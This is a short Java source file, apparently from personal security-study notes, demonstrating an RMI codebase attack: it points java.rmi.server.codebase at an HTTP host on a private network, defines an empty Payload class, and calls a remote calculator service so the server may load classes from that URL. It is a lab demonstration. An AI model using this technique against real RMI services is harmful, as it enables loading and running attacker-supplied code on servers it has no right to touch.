package com.dem0.vuln;

import com.dem0.rmi.ICalc;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.ArrayList;
import java.util.List;

public class codeBaseAttack {
    public static class Payload extends ArrayList<Integer> {}
    static {
        System.setProperty("java.security.policy", "E:\\blog\\study-note\\java安全\\java序列化链\\java安全漫谈\\vuln.policy");
        System.setProperty("java.rmi.server.codebase","http://192.168.59.1:9080/");
        if (System.getSecurityManager() == null) {
            System.out.println("setup SecurityManager");
            System.setSecurityManager(new SecurityManager());
        }

    }
    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException {
        ICalc r = (ICalc) Naming.lookup("rmi://192.168.59.1:1099/r");
        List<Integer> li = new ArrayList<Integer>();
        li.add(1);
        li.add(2);
        System.out.println(r.sum(li));

//        System.out.println(math.equ());
    }
}
